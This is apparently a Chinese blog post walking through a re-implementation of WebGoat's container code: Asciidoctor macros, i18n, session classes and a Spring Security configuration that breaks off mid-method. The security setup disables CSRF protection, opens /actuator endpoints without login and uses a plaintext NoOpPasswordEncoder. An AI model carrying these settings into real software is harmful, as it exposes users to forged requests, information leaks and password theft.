<h3 id="WebGoatVersionMacro"><a href="#WebGoatVersionMacro" class="headerlink" title="WebGoatVersionMacro"></a>WebGoatVersionMacro</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.asciidoc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.asciidoctor.ast.ContentNode;</span><br><span class="line"><span class="keyword">import</span> org.asciidoctor.extension.InlineMacroProcessor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebGoatVersionMacro</span> <span class="keyword">extends</span> <span class="title class_">InlineMacroProcessor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WebGoatVersionMacro</span><span class="params">(String macroName)</span>&#123;<span class="built_in">super</span>(macroName);&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WebGoatVersionMacro</span><span class="params">(String macroName, Map&lt;String,Object&gt; config)</span>&#123;<span class="built_in">super</span>(macroName,config);&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">process</span><span class="params">(ContentNode contentNode,String target,Map&lt;String,Object&gt; attributes)</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">webgoatVersion</span> <span class="operator">=</span> EnvironmentExposure.getEnv().getProperty(<span class="string">&quot;webgoat.build.version&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> createPhraseNode(contentNode,<span class="string">&quot;quoted&quot;</span>,webgoatVersion);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="WebGoatTmpDirMacro"><a href="#WebGoatTmpDirMacro" class="headerlink" title="WebGoatTmpDirMacro"></a>WebGoatTmpDirMacro</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.asciidoc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.asciidoctor.ast.ContentNode;</span><br><span class="line"><span class="keyword">import</span> org.asciidoctor.extension.InlineMacroProcessor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebGoatTmpDirMacro</span> <span class="keyword">extends</span> <span class="title class_">InlineMacroProcessor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WebGoatTmpDirMacro</span><span class="params">(String macroName)</span>&#123;<span class="built_in">super</span>(macroName);&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WebGoatTmpDirMacro</span><span class="params">(String macroName, Map&lt;String ,Object&gt; config)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(macroName, config);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">process</span><span class="params">(ContentNode contentNode,String  target,Map&lt;String ,Object&gt; attributes)</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">env</span> <span class="operator">=</span> EnvironmentExposure.getEnv().getProperty(<span class="string">&quot;webgoat.server.directory&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> createPhraseNode(contentNode,<span class="string">&quot;quoted&quot;</span>,env);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="OperatingSystemMacro"><a href="#OperatingSystemMacro" class="headerlink" title="OperatingSystemMacro"></a>OperatingSystemMacro</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.asciidoc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.asciidoctor.ast.ContentNode;</span><br><span class="line"><span class="keyword">import</span> org.asciidoctor.extension.InlineMacroProcessor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OperatingSystemMacro</span> <span class="keyword">extends</span> <span class="title class_">InlineMacroProcessor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OperatingSystemMacro</span><span class="params">(String macroName)</span>&#123;<span class="built_in">super</span>(macroName);&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OperatingSystemMacro</span><span class="params">(String macroName, Map&lt;String,Object&gt; config)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(macroName,config);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">process</span><span class="params">(ContentNode contentNode,String target,Map&lt;String ,Object&gt; attributes)</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">osName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> createPhraseNode(contentNode,<span class="string">&quot;quoted&quot;</span>,osName);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="UsernameMacro"><a href="#UsernameMacro" class="headerlink" title="UsernameMacro"></a>UsernameMacro</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.asciidoc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.WebGoat;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.WebGoatUser;</span><br><span class="line"><span class="keyword">import</span> org.asciidoctor.ast.ContentNode;</span><br><span class="line"><span class="keyword">import</span> org.asciidoctor.extension.InlineMacroProcessor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.context.SecurityContextHolder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UsernameMacro</span> <span class="keyword">extends</span> <span class="title class_">InlineMacroProcessor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UsernameMacro</span><span class="params">(String macroName)</span>&#123;<span class="built_in">super</span>(macroName);&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UsernameMacro</span><span class="params">(String macroName, Map&lt;String,Object&gt; config)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(macroName,config);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">process</span><span class="params">(ContentNode contentNode,String target,Map&lt;String ,Object&gt; attributes)</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">auth</span> <span class="operator">=</span> SecurityContextHolder.getContext().getAuthentication();</span><br><span class="line">        <span class="type">var</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (auth.getPrincipal() <span class="keyword">instanceof</span> WebGoatUser webGoatUser)&#123;</span><br><span class="line">            username = webGoatUser.getUsername();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> createPhraseNode(contentNode,<span class="string">&quot;quoted&quot;</span>,username);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="i18n"><a href="#i18n" class="headerlink" title="i18n"></a>i18n</h2><h3 id="PluginMessages"><a href="#PluginMessages" class="headerlink" title="PluginMessages"></a>PluginMessages</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.i18n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ReloadableResourceBundleMessageSource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.support.ResourcePatternResolver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PluginMessages</span> <span class="keyword">extends</span> <span class="title class_">ReloadableResourceBundleMessageSource</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PROPERTIES_SUFFIX</span> <span class="operator">=</span> <span class="string">&quot;.properties&quot;</span>;</span><br><span class="line"><span class="comment">//    定义后缀</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Language language;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ResourcePatternResolver resourcePatternResolver;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PluginMessages</span><span class="params">(Messages messages,Language language,ResourcePatternResolver resourcePatternResolver)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.language = language;</span><br><span class="line">        <span class="built_in">this</span>.setParentMessageSource(messages);</span><br><span class="line">        <span class="built_in">this</span>.setBasename(<span class="string">&quot;WebGoatLabels&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.resourcePatternResolver = resourcePatternResolver;</span><br><span class="line"><span class="comment">//        进行初始化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> PropertiesHolder <span class="title function_">refreshProperties</span><span class="params">(String filename,PropertiesHolder propertiesHolder)</span>&#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        <span class="type">long</span> <span class="variable">lastModified</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">resources</span> <span class="operator">=</span> resourcePatternResolver.getResources(<span class="string">&quot;classpath:/lessons/**/i18n&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;/WebGoatLabels&quot;</span>+PROPERTIES_SUFFIX);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> resource : resources)&#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">sourcePath</span> <span class="operator">=</span> resource.getURI().toString().replace(PROPERTIES_SUFFIX,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">//                获取资源路径</span></span><br><span class="line">                <span class="type">PropertiesHolder</span> <span class="variable">holder</span> <span class="operator">=</span> <span class="built_in">super</span>.refreshProperties(sourcePath,propertiesHolder);</span><br><span class="line">                properties.putAll(holder.getProperties());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;Unable to read plugin message&quot;</span>,e);</span><br><span class="line"><span class="comment">//            打印异常</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PropertiesHolder</span>(properties,lastModified);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getMessages</span><span class="params">()</span>&#123;<span class="keyword">return</span> getMergedProperties(language.getLocale()).getProperties();&#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">(String code,Object... args)</span>&#123;<span class="keyword">return</span> getMessage(code,args,language.getLocale());&#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">(String code,String defaultValue,Object... args)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getMessage(code,args,defaultValue,language.getLocale());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Language"><a href="#Language" class="headerlink" title="Language"></a>Language</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.i18n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.LocaleResolver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="comment">//作用于类，生成参数为所有实例变量的构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Language</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LocaleResolver localeResolver;</span><br><span class="line">    <span class="keyword">public</span> Locale <span class="title function_">getLocale</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> localeResolver.resolveLocale(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Messages"><a href="#Messages" class="headerlink" title="Messages"></a>Messages</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.i18n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ReloadableResourceBundleMessageSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="comment">//作用于类，生成参数为所有实例变量的构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Messages</span> <span class="keyword">extends</span> <span class="title class_">ReloadableResourceBundleMessageSource</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Language language;</span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getMessages</span><span class="params">()</span>&#123;<span class="keyword">return</span> getMergedProperties(language.getLocale()).getProperties();&#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">(String code,Object... args)</span>&#123;<span class="keyword">return</span> getMessage(code,args,language.getLocale());&#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">(String code,String defaultValue,Object... args)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getMessage(code,args,defaultValue,language.getLocale());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="session-1"><a href="#session-1" class="headerlink" title="session"></a>session</h2><h3 id="LabelDebugger"><a href="#LabelDebugger" class="headerlink" title="LabelDebugger"></a>LabelDebugger</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.session;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LabelDebugger</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> enabled=<span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEnabled</span><span class="params">()</span>&#123;<span class="keyword">return</span> enabled;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">enable</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.enabled = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">disable</span><span class="params">()</span>&#123;<span class="built_in">this</span>.enabled = <span class="literal">false</span>;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEnabled</span><span class="params">(<span class="type">boolean</span> enabled)</span>&#123;<span class="built_in">this</span>.enabled = enabled;&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="启动试一下"><a href="#启动试一下" class="headerlink" title="启动试一下"></a>启动试一下</h1><p>报这个错</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220705104852655.png" alt="image-20220705104852655"></p>
<p>这里查这个错误 最后还是没找到具体那个依赖出现了问题,这里最终也是排除到了依赖上面出了问题,这里我们就直接使用webgoat的依赖了,其中有一个问题</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220705172611280.png" alt="image-20220705172611280"></p>
<p>使用时需要先删除这个日志管理</p>
<p>启动之后这里做了渲染,是自带的吗</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220705172753229.png" alt="image-20220705172753229"></p>
<p>其实这是Spring Boot自带的安全自动配置</p>
<p>在日志这里也有密码 用户名是user</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220705204826857.png" alt="image-20220705204826857"></p>
<p>测试一下是没有问题的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220705205054461.png" alt="image-20220705205054461"></p>
<p>这里我们是因为还没有配置WebSecurityConfig所以才会这样</p>
<h1 id="container-2"><a href="#container-2" class="headerlink" title="container"></a>container</h1><h2 id="WebSecurityConfig"><a href="#WebSecurityConfig" class="headerlink" title="WebSecurityConfig"></a>WebSecurityConfig</h2><p>资料</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * .loginPage(&quot;/login.html&quot;)指定了跳转到登录页面的请求URL，</span></span><br><span class="line"><span class="comment"> * .loginProcessingUrl(&quot;/login&quot;)对应登录页面form表单的action=&quot;/login&quot;，</span></span><br><span class="line"><span class="comment"> * .antMatchers(&quot;/login.html&quot;).permitAll()表示跳转到登录页面的请求不被拦截</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> http</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http.addFilterBefore(validateCodeFilter, UsernamePasswordAuthenticationFilter.class) <span class="comment">// 添加验证码校验过滤器</span></span><br><span class="line">            .addFilterBefore(smsCodeFilter, UsernamePasswordAuthenticationFilter.class) <span class="comment">// 添加短信验证码校验过滤器</span></span><br><span class="line">            .formLogin() <span class="comment">// 表单登录</span></span><br><span class="line">            <span class="comment">// http.httpBasic() // HTTP Basic</span></span><br><span class="line">            .loginPage(<span class="string">&quot;/authentication/require&quot;</span>) <span class="comment">// 登录跳转 URL, 进行验证或者登陆页 跳转</span></span><br><span class="line">            .loginProcessingUrl(<span class="string">&quot;/login&quot;</span>) <span class="comment">// 处理表单登录 URL</span></span><br><span class="line">            .successHandler(authenticationSucessHandler) <span class="comment">// 处理登录成功</span></span><br><span class="line">            .failureHandler(authenticationFailureHandler) <span class="comment">// 处理登录失败</span></span><br><span class="line">            .and()</span><br><span class="line">            .rememberMe()</span><br><span class="line">            .tokenRepository(persistentTokenRepository()) <span class="comment">// 配置 token 持久化仓库</span></span><br><span class="line">            .tokenValiditySeconds(<span class="number">3600</span>) <span class="comment">// remember 过期时间，单为秒</span></span><br><span class="line">            .userDetailsService(userDetailService) <span class="comment">// 处理自动登录逻辑</span></span><br><span class="line">            .and()</span><br><span class="line">            .authorizeRequests() <span class="comment">// 授权配置</span></span><br><span class="line">            .antMatchers(<span class="string">&quot;/authentication/require&quot;</span>, <span class="string">&quot;/login.html&quot;</span>, <span class="string">&quot;/code/image&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;/code/sms&quot;</span>, <span class="string">&quot;/session/invalid&quot;</span>, <span class="string">&quot;/css/*&quot;</span>, <span class="string">&quot;/js/*&quot;</span>, <span class="string">&quot;/login1.html&quot;</span>, <span class="string">&quot;/statics/**&quot;</span>, <span class="string">&quot;/signout/success&quot;</span>).permitAll() <span class="comment">// 登录跳转 URL 无需认证 (含登录页的静态资源)</span></span><br><span class="line">            .anyRequest()  <span class="comment">// 所有请求</span></span><br><span class="line">            .authenticated() <span class="comment">// 都需要认证</span></span><br><span class="line">            .and()</span><br><span class="line">            .sessionManagement() <span class="comment">// 添加 Session管理器</span></span><br><span class="line">            .invalidSessionUrl(<span class="string">&quot;/session/invalid&quot;</span>) <span class="comment">// Session失效后跳转到这个链接</span></span><br><span class="line">            .maximumSessions(<span class="number">1</span>) <span class="comment">//最大session并发数量，超过定义数量前一个session就会失效</span></span><br><span class="line">            .maxSessionsPreventsLogin(<span class="literal">true</span>) <span class="comment">//Session达到最大有效数的时候，不再允许相同的账户登录。</span></span><br><span class="line">            .expiredSessionStrategy(mySessionExpiredStrategy)<span class="comment">//配置了Session在并发下失效后的处理策略;</span></span><br><span class="line">            .sessionRegistry(sessionRegistry)<span class="comment">//添加 session 注册</span></span><br><span class="line">            .and()</span><br><span class="line">            .and()</span><br><span class="line">            .logout()<span class="comment">//自定义退出登录</span></span><br><span class="line">            .logoutUrl(<span class="string">&quot;/signout&quot;</span>)<span class="comment">//退出登录的URL</span></span><br><span class="line">            .invalidateHttpSession(<span class="literal">true</span>)</span><br><span class="line">            <span class="comment">//.logoutSuccessUrl(&quot;/signout/success&quot;)//退出成功后跳转的URL</span></span><br><span class="line">            .deleteCookies(<span class="string">&quot;JSESSIONID&quot;</span>)<span class="comment">//退出成功后删除名称为JSESSIONID的cookie, 删除不成功？？？</span></span><br><span class="line">            .logoutSuccessHandler(logOutSuccessHandler) <span class="comment">//logoutSuccessHandler指定退出成功处理器来处理退出成功后的逻辑：</span></span><br><span class="line">            .and()</span><br><span class="line">            .csrf().disable()<span class="comment">// 关闭 CSRF攻击防御关了</span></span><br><span class="line">            .apply(smsAuthenticationConfig);<span class="comment">// 将短信验证码认证配置加到 Spring Security 中</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.UserService;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.NoOp;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.authentication.AuthenticationManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.builders.HttpSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.configurers.ExpressionUrlAuthorizationConfigurer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetailsService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.crypto.password.NoOpPasswordEncoder;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">//用于定义配置类</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="comment">//自动生成构造方法</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="comment">//@EnableWebSecurity，用于在我们的项目中启用SpringSecurity。为某些请求路径开启安全认证策略。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSecurityConfig</span> <span class="keyword">extends</span> <span class="title class_">WebSecurityConfigurerAdapter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserService userDetailsService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(HttpSecurity httpSecurity)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ExpressionUrlAuthorizationConfigurer&lt;HttpSecurity&gt;.<span class="type">ExpressionInterceptUrlRegistry</span> <span class="variable">security</span> <span class="operator">=</span> httpSecurity</span><br><span class="line">                .authorizeRequests()</span><br><span class="line"><span class="comment">//                http请求是否要登录认证</span></span><br><span class="line">                .antMatchers(<span class="string">&quot;/css/**&quot;</span>, <span class="string">&quot;/images/**&quot;</span>, <span class="string">&quot;/js/**&quot;</span>, <span class="string">&quot;fonts/**&quot;</span>, <span class="string">&quot;/plugins/**&quot;</span>, <span class="string">&quot;/registration&quot;</span>, <span class="string">&quot;/register.mvc&quot;</span>, <span class="string">&quot;/actuator/**&quot;</span>).permitAll()</span><br><span class="line"><span class="comment">//                antMatcher用在多个HttpSecurity的场景下，用来为每个HttpSecurity过滤  permitAll() 不管登入,不登入 都能访问</span></span><br><span class="line">                .anyRequest().authenticated();</span><br><span class="line"><span class="comment">//               任何请求都必须经过身份验证</span></span><br><span class="line">        security.and()</span><br><span class="line"><span class="comment">//                 and() 是将方法链接在一起的一种方式。</span></span><br><span class="line">                .formLogin()</span><br><span class="line">                .loginPage(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"><span class="comment">//                在未登录时自动跳转到login页面</span></span><br><span class="line">                .defaultSuccessUrl(<span class="string">&quot;/welcome.mvc&quot;</span>, <span class="literal">true</span>)</span><br><span class="line"><span class="comment">//                登录认证成功之后默认跳转的路径 defaultSuccessUrl 就是说，它会默认跳转到 Referer 来源页面，如果 Referer 为空，没有来源页，则跳转到默认设置的页面。</span></span><br><span class="line"><span class="comment">//        successForwardUrl 表示不管 Referer 从何而来，登录成功后一律跳转到指定的地址  defaultSuccessUrl 中如果第二个参数输入为 true，则效果和 successForwardUrl 一致。</span></span><br><span class="line">                .usernameParameter(<span class="string">&quot;username&quot;</span>)</span><br><span class="line"><span class="comment">//                登录表单form中用户名输入框中的name名,不修改的话默认是username</span></span><br><span class="line">                .passwordParameter(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"><span class="comment">//                登录表单form中面输入框input的name名,不修改的话默认就是password</span></span><br><span class="line">                .permitAll();</span><br><span class="line"><span class="comment">//        不需要登录就可以访问的</span></span><br><span class="line">        security.and()</span><br><span class="line"><span class="comment">//                将方法连接在一起的方式NMnmnmMMmMmmMMmmM</span></span><br><span class="line">                .logout().deleteCookies(<span class="string">&quot;JSESSIONID&quot;</span>).invalidateHttpSession(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//        登出 删除cookies</span></span><br><span class="line">        security.and().csrf().disable();</span><br><span class="line"><span class="comment">//        关闭csrf防护</span></span><br><span class="line">        httpSecurity.headers().cacheControl().disable();</span><br><span class="line"><span class="comment">//      禁用缓存</span></span><br><span class="line">        httpSecurity.exceptionHandling().authenticationEntryPoint(<span class="keyword">new</span> <span class="title class_">AjaxAuthenticationEntryPoint</span>(<span class="string">&quot;/login&quot;</span>));</span><br><span class="line"><span class="comment">//       添加自定义的未授权和为登录结果返回</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line"><span class="comment">//    这个注解就是spring可以自动帮你把Bean里面引用的对象的setter/getter方法省略,他会自动帮你set/get</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureGlobal</span><span class="params">(AuthenticationManagerBuilder auth)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        auth.userDetailsService(userDetailsService);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> UserDetailsService <span class="title function_">userDetailsServiceBean</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">return</span> userDetailsService;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">protected</span> AuthenticationManager <span class="title function_">authenticationManager</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.authenticationManager();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;deprecation&quot;)</span></span><br><span class="line"><span class="comment">//    表示不检测过期的方法,不显示使用了不赞成使用的类或方法时的警告</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> NoOpPasswordEncoder <span class="title function_">passwordEncoder</span><span class="params">()</span>&#123;</span><br><span class="line">        